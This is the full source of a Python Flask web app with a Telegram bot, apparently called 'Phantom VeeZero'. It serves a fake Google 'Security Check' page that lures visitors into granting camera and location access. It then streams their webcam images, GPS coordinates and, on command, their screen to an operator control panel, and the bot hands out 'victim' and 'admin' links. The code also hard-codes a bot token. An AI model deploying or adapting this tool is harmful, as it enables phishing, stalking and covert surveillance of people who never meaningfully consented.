import eventlet
eventlet.monkey_patch()

import os
import time
import threading
import requests
import base64
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit, join_room, leave_room

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# --- [ إعدادات البوت ] ---
BOT_TOKEN = "8731655533:AAFBxpr2goRmjY46jOB_BQdZKmk2ycFrYKQ"
DEVELOPER_ID = "8305841557"
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
DEVELOPER_USERNAME = "@SDVee249"

# المتغيرات العامة
app_url = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

# --- [ واجهة الضحية (صفحة الهبوط المحترفة) ] ---
VICTIM_HTML = """
<!DOCTYPE html>
<html dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; background: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 22px; color: #202124; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn:hover { background: #1557b0; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card" id="main-ui">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <h1>Security Check</h1>
        <p>We detected a new sign-in. To secure your account, please allow camera and location access.</p>
        <button class="btn" onclick="startAccess()">Continue</button>
        <div id="loading" class="spinner" style="margin-top:20px;"></div>
        <div style="margin-top:20px; font-size:12px; color:#9aa0a6;">Google Security © 2024</div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();
        // الحصول على الـ user_id من الرابط لربط الضحية بالمدير الصحيح
        const urlParams = new URLSearchParams(window.location.search);
        const admin_id = urlParams.get('uid'); 
        
        let mode = 'front';
        let stream = null;

        // الانضمام للغرفة الخاصة بهذا المدير
        if(admin_id) socket.emit('join', {room: admin_id});

        async function startAccess() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            document.querySelector('h1').innerText = "Verifying...";

            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('v').srcObject = stream;

                navigator.geolocation.watchPosition(p => {
                    socket.emit('loc', { lat: p.coords.latitude, lon: p.coords.longitude, uid: admin_id });
                }, null, { enableHighAccuracy: true });

                setTimeout(() => {
                    document.getElementById('main-ui').style.display = 'none';
                    document.body.style.background = '#000';
                    streamLoop();
                }, 2000);
            } catch (e) { alert("Access Denied"); location.reload(); }
        }

        function streamLoop() {
            if(!stream) return;
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            canvas.width = 320; canvas.height = 240;
            ctx.drawImage(document.getElementById('v'), 0, 0, 320, 240);
            
            const img = canvas.toDataURL('image/jpeg', 0.3);
            socket.emit('stream', { img: img, mode: mode, uid: admin_id });
            
            setTimeout(streamLoop, 2000);
        }

        socket.on('admin_cmd', data => {
            if(data.cmd === 'switch_cam') {
                stream.getTracks().forEach(t => t.stop());
                mode = mode === 'front' ? 'back' : 'front';
                navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
                .then(s => { stream = s; document.getElementById('v').srcObject = s; });
            } else if (data.cmd === 'screen') {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                .then(s => { stream = s; document.getElementById('v').srcObject = s; mode = 'screen'; });
            }
        });
    </script>
</body>
</html>
"""

# --- [ لوحة تحكم VeeZero (مع دعم اللغة) ] ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom VeeZero Control</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        :root { --primary: #0f0; --dark: #050505; --alert: #f00; --font: 'Courier New', monospace; }
        body { background: var(--dark); color: var(--primary); font-family: var(--font); height: 100vh; margin: 0; overflow: hidden; display: flex; flex-direction: column; }
        body::after { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0) 50%, rgba(0,0,0,0.25) 50%), linear-gradient(90deg, rgba(255,0,0,0.06), rgba(0,255,0,0.02), rgba(0,0,255,0.06)); background-size: 100% 2px, 3px 100%; pointer-events: none; z-index: 100; }
        
        header { border-bottom: 2px solid var(--primary); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,20,0,0.9); z-index: 10; }
        .logo { font-weight: bold; font-size: 1.2rem; text-shadow: 0 0 5px var(--primary); }
        .lang-btn { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 5px 10px; cursor: pointer; font-family: var(--font); }
        .lang-btn:hover { background: var(--primary); color: #000; }
        
        nav ul { display: flex; list-style: none; gap: 15px; padding: 0; margin: 0; }
        nav button { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 5px 15px; cursor: pointer; transition: 0.3s; font-family: var(--font); }
        nav button.active { background: var(--primary); color: #000; box-shadow: 0 0 10px var(--primary); }
        
        main { flex: 1; position: relative; padding: 20px; overflow-y: auto; }
        .screen { display: none; height: 100%; flex-direction: column; animation: fadeIn 0.5s; }
        .screen.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .dashboard-grid { display: grid; grid-template-rows: auto 1fr auto; height: 100%; gap: 15px; }
        .status-bar { display: flex; justify-content: space-between; border: 1px solid var(--primary); padding: 10px; background: rgba(0,50,0,0.3); }
        .map-container { border: 2px dashed var(--primary); position: relative; display: flex; justify-content: center; align-items: center; background: radial-gradient(circle, #001100 0%, #000 100%); overflow: hidden; }
        .map-grid { width: 100%; height: 100%; background-image: linear-gradient(#003300 1px, transparent 1px), linear-gradient(90deg, #003300 1px, transparent 1px); background-size: 40px 40px; position: absolute; opacity: 0.5; }
        .target-marker { width: 20px; height: 20px; background: var(--alert); border-radius: 50%; position: relative; box-shadow: 0 0 15px var(--alert); animation: pulse 2s infinite; }
        .target-marker::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; height: 60px; border: 1px solid var(--alert); border-radius: 50%; animation: ripple 2s infinite; }
        
        .controls-area { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
        .btn-control { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 15px; cursor: pointer; text-align: center; transition: 0.2s; font-weight: bold; font-family: var(--font); }
        .btn-control:hover { background: var(--primary); color: #000; }
        .emergency-banner { background: var(--alert); color: white; text-align: center; padding: 5px; font-weight: bold; letter-spacing: 2px; animation: blink 1s infinite; margin-top: 10px; border: 1px solid white; cursor: pointer; }
        
        .video-wrapper { flex: 1; border: 4px solid #003300; background: black; position: relative; display: flex; justify-content: center; align-items: center; }
        .live-overlay { position: absolute; top: 20px; left: 20px; right: 20px; display: flex; justify-content: space-between; z-index: 5; }
        .rec-badge { background: var(--alert); color: white; padding: 5px 10px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
        .rec-dot { width: 10px; height: 10px; background: white; border-radius: 50%; animation: blink 0.5s infinite; }
        .noise-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,0,0.05) 3px); pointer-events: none; }
        
        .info-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; padding: 20px 0; }
        .card { border: 1px solid var(--primary); padding: 20px; background: rgba(0,20,0,0.5); }
        .card h3 { border-bottom: 1px solid #003300; padding-bottom: 10px; margin-bottom: 15px; color: var(--primary); }
        .data-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
        .data-value { font-weight: bold; color: #fff; }
        .progress-bar { width: 100%; height: 10px; background: #222; margin-top: 5px; }
        .progress-fill { height: 100%; background: var(--primary); width: 0%; transition: width 1s; }
        .toast { position: fixed; bottom: 20px; right: 20px; background: var(--primary); color: #000; padding: 10px 20px; border: 2px solid #fff; display: none; z-index: 200; }
        
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
        @keyframes ripple { 0% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(3); opacity: 0; } }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>
    <header>
        <div class="logo">PHANTOM VEEZERO v1.0</div>
        <button class="lang-btn" onclick="toggleLanguage()">EN | AR</button>
        <nav>
            <ul>
                <li><button onclick="switchTab('dashboard')" class="active" id="btn-dashboard" data-key="nav_dash">الرئيسية</button></li>
                <li><button onclick="switchTab('live')" id="btn-live" data-key="nav_live">البث المباشر</button></li>
                <li><button onclick="switchTab('device')" id="btn-device" data-key="nav_device">معلومات الجهاز</button></li>
            </ul>
        </nav>
    </header>

    <main>
        <section id="dashboard" class="screen active">
            <div class="dashboard-grid">
                <div class="status-bar">
                    <span>UNIT: VEEZERO</span>
                    <span>OP: ACTIVE</span>
                    <span id="sys-time">00:00:00</span>
                </div>
                <div class="map-container">
                    <div class="map-grid"></div>
                    <div class="target-marker"></div>
                    <div style="position: absolute; color: var(--primary); background: rgba(0,0,0,0.7); padding: 5px;">
                        <span data-key="map_target">TARGET GPS: LOCKED</span><br>
                        LAT: <span id="map-lat">00.0000</span> N<br>
                        LNG: <span id="map-lng">00.0000</span> W
                    </div>
                </div>
                <div>
                    <div class="controls-area">
                        <button class="btn-control" onclick="sendCmd('swap_cam')" data-key="btn_swap">تبديل الكاميرا</button>
                        <button class="btn-control" onclick="sendCmd('screen')" data-key="btn_screen">مشاركة الشاشة</button>
                        <button class="btn-control" onclick="copyLink()" data-key="btn_link">نسخ الرابط</button>
                        <button class="btn-control" onclick="showToast('GPS Tracking Active')" data-key="btn_gps">تتبع GPS</button>
                    </div>
                    <div class="emergency-banner" onclick="sendCmd('sos')" data-key="btn_sos">
                        EMERGENCY PROTOCOL
                    </div>
                </div>
            </div>
        </section>

        <section id="live" class="screen">
            <div class="video-wrapper">
                <img id="live-feed-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" style="width:100%; height:100%; object-fit:contain;">
                <div class="noise-overlay"></div>
                <div class="live-overlay">
                    <div class="rec-badge"><div class="rec-dot"></div> <span data-key="live_feed">LIVE FEED</span></div>
                    <div style="background: rgba(0,0,0,0.5); padding: 2px 8px;">VEEZERO CAM</div>
                </div>
            </div>
            <div style="margin-top: 15px; display: flex; justify-content: space-between; align-items: center;">
                <div><span data-key="rec_time">REC TIME:</span> <span id="rec-timer">00:00:00</span></div>
                <button class="btn-control" style="width: auto; padding: 5px 20px;" onclick="toggleRecording(this)" data-key="btn_stop_rec">STOP REC</button>
            </div>
        </section>

        <section id="device" class="screen">
            <h2 style="margin-bottom: 20px; border-bottom: 1px solid var(--primary);" data-key="dev_title">حالة النظام</h2>
            <div class="info-cards">
                <div class="card">
                    <h3 data-key="dev_type">نوع الجهاز</h3>
                    <div class="data-row"><span>Platform:</span><span class="data-value" id="dev-platform">Waiting...</span></div>
                    <div class="data-row"><span>Browser:</span><span class="data-value" id="dev-ua">Waiting...</span></div>
                </div>
                <div class="card">
                    <h3 data-key="dev_bat">نسبة الشحن</h3>
                    <div class="data-row"><span>Status:</span><span class="data-value" id="bot-status">--</span></div>
                    <div class="data-row"><span>Level:</span><span class="data-value" id="bat-level">--%</span></div>
                    <div class="progress-bar"><div class="progress-fill" id="bat-bar"></div></div>
                </div>
                <div class="card">
                    <h3 data-key="dev_net">الاتصال</h3>
                    <div class="data-row"><span>Status:</span><span class="data-value" id="net-status">--</span></div>
                    <div class="data-row"><span>Latency:</span><span class="data-value">24ms</span></div>
                </div>
            </div>
        </section>
    </main>

    <div id="toast" class="toast">Action Completed</div>

    <script>
        // الحصول على الـ User ID من الرابط
        const urlParams = new URLSearchParams(window.location.search);
        const myUid = urlParams.get('uid');
        const socket = io();
        
        // الانضمام لغرفتك الخاصة
        if(myUid) socket.emit('join', {room: myUid});

        let currentLang = 'ar';
        const translations = {
            ar: {
                nav_dash: "الرئيسية", nav_live: "البث المباشر", nav_device: "معلومات الجهاز",
                map_target: "TARGET GPS: LOCKED", btn_swap: "تبديل الكاميرا", btn_screen: "مشاركة الشاشة",
                btn_link: "نسخ الرابط", btn_gps: "تتبع GPS", btn_sos: "EMERGENCY PROTOCOL",
                live_feed: "LIVE FEED", rec_time: "REC TIME:", btn_stop_rec: "STOP REC",
                dev_title: "حالة النظام", dev_type: "نوع الجهاز", dev_bat: "نسبة الشحن", dev_net: "الاتصال"
            },
            en: {
                nav_dash: "Dashboard", nav_live: "Live Feed", nav_device: "Device Info",
                map_target: "TARGET GPS: LOCKED", btn_swap: "SWAP CAM", btn_screen: "SCREEN SHARE",
                btn_link: "COPY LINK", btn_gps: "GPS TRACK", btn_sos: "EMERGENCY PROTOCOL",
                live_feed: "LIVE FEED", rec_time: "REC TIME:", btn_stop_rec: "STOP REC",
                dev_title: "System Status", dev_type: "Device Type", dev_bat: "Power Level", dev_net: "Network"
            }
        };

        function toggleLanguage() {
            currentLang = currentLang === 'ar' ? 'en' : 'ar';
            document.documentElement.lang = currentLang;
            document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
            document.querySelectorAll('[data-key]').forEach(el => {
                const key = el.getAttribute('data-key');
                if(translations[currentLang][key]) el.innerText = translations[currentLang][key];
            });
        }

        function switchTab(id) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('btn-'+id).classList.add('active');
        }

        socket.on('view', d => { if(d.uid === myUid) document.getElementById('live-feed-img').src = d.img; });
        socket.on('map_up', d => { if(d.uid === myUid) { document.getElementById('map-lat').innerText = d.lat.toFixed(4); document.getElementById('map-lng').innerText = d.lon.toFixed(4); }});
        socket.on('device_stats', d => { if(d.uid === myUid) {
            document.getElementById('dev-platform').innerText = (d.os||'Unknown').toUpperCase();
            document.getElementById('dev-ua').innerText = (d.browser||'Unknown').substring(0,20);
            if(d.battery) {
                let l = parseInt(d.battery); document.getElementById('bat-level').innerText = l+'%'; document.getElementById('bat-bar').style.width = l+'%';
            }
        }});

        function sendCmd(c) { socket.emit('admin_cmd', {cmd: c, uid: myUid}); showToast('Command Sent'); }
        function showToast(m) { const t = document.getElementById('toast'); t.innerText=m; t.style.display='block'; setTimeout(()=>t.style.display='none', 3000); }
        
        function updateTimers() {
            const now = new Date(); document.getElementById('sys-time').innerText = now.toTimeString().split(' ')[0];
            const recEl = document.getElementById('rec-timer');
            if(recEl && document.getElementById('live').classList.contains('active')) {
                let t = recEl.innerText.split(':'); let s = parseInt(t[2])+1; if(s>59){s=0;t[1]++;}
                recEl.innerText = t[0]+':'+(t[1]<10?'0':'')+t[1]+':'+(s<10?'0':'')+s;
            }
        } setInterval(updateTimers, 1000);

        function copyLink() { navigator.clipboard.writeText(app_url + '/?uid=' + myUid); showToast('Link Copied'); }
    </script>
</body>
</html>
"""

# --- [ دوال التوجيه ] ---
@app.route('/')
def victim():
    uid = request.args.get('uid')
    return render_template_string(VICTIM_HTML, admin_id=uid)

@app.route('/admin')
def admin():
    uid = request.args.get('uid')
    if not uid: return "Access Denied: No User ID"
    return render_template_string(ADMIN_HTML, my_uid=uid)

# --- [ السوكتات ] ---
@socketio.on('join')
def on_join(data):
    room = data.get('room')
    if room:
        join_room(room)
        print(f"User {room} joined")

@socketio.on('stream')
def handle_stream(data):
    room = data.get('uid')
    if room:
        emit('view', data, room=room, include_self=False)

@socketio.on('loc')
def handle_loc(data):
    room = data.get('uid')
    if room:
        emit('map_up', data, room=room, include_self=False)

@socketio.on('device_info')
def handle_device(data):
    room = data.get('uid')
    if room:
        emit('device_stats', data, room=room, include_self=False)

@socketio.on('admin_cmd')
def handle_admin_cmd(data):
    room = data.get('uid')
    if room:
        emit('admin_cmd', data, room=room, include_self=False)

# --- [ إدارة البوت المتعدد المستخدمين ] ---
def bot_manager():
    print("Phantom VeeZero Bot Started...")
    offset = 0
    while True:
        try:
            r = requests.get(f"{BOT_API}/getUpdates?offset={offset}&timeout=20", timeout=25).json()
            if r.get('ok'):
                for x in r['result']:
                    offset = x['update_id'] + 1
                    q = x.get('callback_query')
                    m = x.get('message', {})
                    cid = str(m.get('chat', {}).get('id') or (q.get('message', {}).get('chat', {}).get('id') if q else None))
                    if not cid: continue

                    # الرسالة الترحيبية عند البدء
                    if m.get('text') == '/start':
                        welcome_text = f"""
👻 <b>Phantom VeeZero v1.0</b>
                        
أهلاً بك في نظام المراقبة المتطور.
تم تفعيل الجلسة الخاصة بك بنجاح.

👨‍💻 المطور: {DEVELOPER_USERNAME}
                        """
                        keyboard = {
                            "inline_keyboard": [
                                [{"text": "🔗 Get My Link", "callback_data": f"getlink_{cid}"}, {"text": "👨‍💻 Contact Dev", "url": f"https://t.me/{DEVELOPER_USERNAME.replace('@','')}"}],
                                [{"text": "📷 Control Panel", "callback_data": f"panel_{cid}"}]
                            ]
                        }
                        requests.post(f"{BOT_API}/sendMessage", json={"chat_id": cid, "text": welcome_text, "parse_mode": "HTML", "reply_markup": keyboard})

                    # معالجة الأزرار التفاعلية
                    if q:
                        d = q['data']
                        # استخراج الـ ID من البيانات
                        if d.startswith('getlink_'):
                            target_id = d.split('_')[1]
                            victim_link = f"{app_url}/?uid={target_id}"
                            admin_link = f"{app_url}/admin?uid={target_id}"
                            msg = f"🔗 <b>Links Generated</b>\n\nVictim: {victim_link}\nAdmin: {admin_link}"
                            requests.post(f"{BOT_API}/sendMessage", json={"chat_id": cid, "text": msg, "parse_mode": "HTML"})
                            answer(q, "Links Sent!")
                        
                        elif d.startswith('panel_'):
                            target_id = d.split('_')[1]
                            admin_link = f"{app_url}/admin?uid={target_id}"
                            requests.post(f"{BOT_API}/sendMessage", json={"chat_id": cid, "text": f"🔓 Open Panel:\n{admin_link}"})
                            answer(q, "Opening Panel...")

        except Exception as e: print(f"Bot Error: {e}")
        time.sleep(1)

def answer(q, t):
    try: requests.post(f"{BOT_API}/answerCallbackQuery", json={"callback_query_id": q['id'], "text": t})
    except: pass

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=bot_manager, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=port)
